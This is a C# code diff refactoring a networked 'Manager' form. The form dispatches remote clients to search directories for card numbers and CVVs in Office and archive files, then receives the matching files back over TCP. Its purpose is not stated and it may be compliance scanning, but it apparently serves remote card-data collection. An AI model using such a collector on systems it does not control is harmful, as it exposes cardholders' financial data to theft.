@@ -37,7 +37,7 @@ namespace Manager
             {
                 Name = "pictureBox",
                 Size = new Size(282, 179),
-                
+
                 Image = Image.FromFile("mono.jpg"),
 
             };
@@ -56,16 +56,18 @@ namespace Manager
 
         }
 
-        public void StartWork()
+        private void StartWork()
         {
+            stopwork = true;
             StartThread = new Thread(FindClients);
             StartThread.IsBackground = true;
             StartThread.Name = "FindClients";
             StartThread.Start();
         }
 
-        public void UpdateProgress()
+        private void UpdateProgress()
         {
+            stopupdate = true;
             UpdateThread = new Thread(UpdateProg);
             UpdateThread.IsBackground = true;
             UpdateThread.Name = "UpdateProgress";
@@ -77,8 +79,23 @@ namespace Manager
             WaitPackThread.Start();
         }
 
+        bool stopwork = false;
+        bool stopupdate = false;
 
-        public Packet Packet { get;  set; }
+        private void Stop()
+        {
+            listener.Stop();
+            listenerw.Stop();
+            listenerq.Stop();
+
+            StartThread.Abort();
+            UpdateThread.Abort();
+            WaitPackThread.Abort();
+        }
+
+        public Packet Packets { get; set; }
+
+        private TcpListener listener;
 
         protected void UpdateProg()
         {
@@ -86,11 +103,11 @@ namespace Manager
             {
                 IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);
 
-                TcpListener listener = new TcpListener(ipAddress, 4568);
+                listener = new TcpListener(ipAddress, 4568);
 
                 listener.Start();
 
-                while (true)
+                while (stopupdate)
                 {
                     Socket clientSocket = listener.AcceptSocket();
 
@@ -104,27 +121,27 @@ namespace Manager
 
                         Array.Copy(buffer, buf, res);
 
-                        Packet = FromByteArray<Packet>(buf);
+                        Packets = FromByteArray<Packet>(buf);
 
                         this.Invoke((MethodInvoker)(() => lvProccess.Items.Clear()));
                         this.Invoke((MethodInvoker)(() => lvProccess.Refresh()));
 
                         foreach (var item in Proccess)
                         {
-                            if (item.IPAdress.Equals(Packet.IPAdress))
+                            if (item.IPAdress.Equals(Packets.IPAdress))
                             {
-                                item.CardType = Packet.CardType;
-                                item.CountFiles = Packet.CountFiles;
-                                item.CurrentFile = Packet.CurrentFile;
-                                item.CVV = Packet.CVV;
-                                item.Directory = Packet.Directory;
-                                item.FileInfo = Packet.FileInfo;
-                                item.FilePath = Packet.FilePath;
-                                item.FindNumber = Packet.FindNumber;
-                                item.IPAdress = Packet.IPAdress;
-                                item.MSOffice = Packet.MSOffice;
-                                item.Progress = Packet.Progress;
-                                item.Rar = Packet.Rar;
+                                item.CardType = Packets.CardType;
+                                item.CountFiles = Packets.CountFiles;
+                                item.CurrentFile = Packets.CurrentFile;
+                                item.CVV = Packets.CVV;
+                                item.Directory = Packets.Directory;
+                                item.FileInfo = Packets.FileInfo;
+                                item.FilePath = Packets.FilePath;
+                                item.FindNumber = Packets.FindNumber;
+                                item.IPAdress = Packets.IPAdress;
+                                item.MSOffice = Packets.MSOffice;
+                                item.Progress = Packets.Progress;
+                                item.Rar = Packets.Rar;
 
                                 ListViewItem items = new ListViewItem();
                                 items.Text = item.IPAdress;
@@ -204,36 +221,42 @@ namespace Manager
             return text;
         }
 
+        private TcpListener listenerw;
+
         private void WaitBigPacket()
         {
-            while (true)
+            try
             {
-                try
-                {
-                    IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);
+                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);
 
-                    var listener = new TcpListener(ipAddress, 4570);
-                    listener.Start();
-                    if (Packet != null)
-                        if (!String.IsNullOrEmpty(Packet.FileInfo))
+                listenerw = new TcpListener(ipAddress, 4570);
+
+                listenerw.Start();
+
+                while (stopupdate)
+                {
+                    if (Packets != null)
+
+                        if (!String.IsNullOrEmpty(Packets.FileInfo))
                         {
-                            using (var incoming = listener.AcceptTcpClient())
+                            using (var incoming = listenerw.AcceptTcpClient())
                             using (var networkStream = incoming.GetStream())
-                            using (var fileStream = File.OpenWrite(Packet.FileInfo))
+                            using (var fileStream = File.OpenWrite(Packets.FileInfo))
                             {
                                 networkStream.CopyTo(fileStream);
                             }
                         }
-
-                    listener.Stop();
-                }
-                catch (SocketException ex)
-                {
-                    // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
                 }
             }
-
+            catch (SocketException ex)
+            {
+                // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
+            }
         }
+
+    
+
+        private TcpListener listenerq;
 
         private void FindClients()
         {
@@ -241,13 +264,13 @@ namespace Manager
             {
                 IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);
 
-                TcpListener listener = new TcpListener(ipAddress, 4569);
+                listenerq = new TcpListener(ipAddress, 4569);
 
-                listener.Start();
+                listenerq.Start();
 
-                while (true)
+                while (stopwork)
                 {
-                    Socket clientSocket = listener.AcceptSocket();
+                    Socket clientSocket = listenerq.AcceptSocket();
 
                     string point = ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString();
 
@@ -255,21 +278,20 @@ namespace Manager
                     {
                         Proccess.CollectionChanged += Proccess_CollectionChanged;
 
-                        Packet pak = new Packet
+                        Packets = new Packet
                         {
                             CardType = GetControlText(cbCard),
                             CVV = chbCVV.Checked,
                             MSOffice = cbOffice.Checked,
-                            Rar = cbRar.Checked,
                             Directory = tbDirectory.Text,
                             IPAdress = point,
                             CountFiles = 0,
                             CurrentFile = 0,
                             FilePath = "",
-                            Progress = 0
-
+                            Progress = 0,
+                            FileInfo = "",
                         };
-                        Proccess.Add(pak);
+                        Proccess.Add(Packets);
                     }
                     clientSocket.Close();
 
@@ -283,13 +305,16 @@ namespace Manager
 
         }
 
-        private void UpdatePackets(Packet item)
+        private void UpdatePackets()
         {
-                item.CardType = GetControlText(cbCard);
-                item.CVV = chbCVV.Checked;
-                item.MSOffice = cbOffice.Checked;
-                item.Rar = cbRar.Checked;
-                item.Directory = tbDirectory.Text;
+            Packets.CardType = GetControlText(cbCard);
+            Packets.CVV = chbCVV.Checked;
+            Packets.MSOffice = cbOffice.Checked;
+            Packets.Directory = tbDirectory.Text;
+            Packets.FileInfo = "";
+            Packets.Progress = 0;
+            Packets.CountFiles = 0;
+            Packets.CurrentFile = 0;
         }
 
         private void Proccess_CollectionChanged(object sender, System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
@@ -368,15 +393,15 @@ namespace Manager
 
         private void button1_Click(object sender, EventArgs e)
         {
-            foreach (var item in Proccess)
-            {
-                if (item.IPAdress.Equals(lbComps.SelectedItem.ToString()))
-                {
-                    UpdatePackets(item);
+            //foreach (var item in Proccess)
+           // {
+                // (item.IPAdress.Equals(lbComps.SelectedItem.ToString()))
+                //{
+                    UpdatePackets();
 
-                    OnSetQuote(item.IPAdress, 4567, item);
-                }
-            }
+                    OnSetQuote(lbComps.SelectedItem.ToString(), 4567, Packets);
+                //}
+           // }
         }
 
         private void Start_Click(object sender, EventArgs e)
@@ -384,6 +409,11 @@ namespace Manager
             StartWork();
 
             UpdateProgress();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Stop();
         }
     }
 }
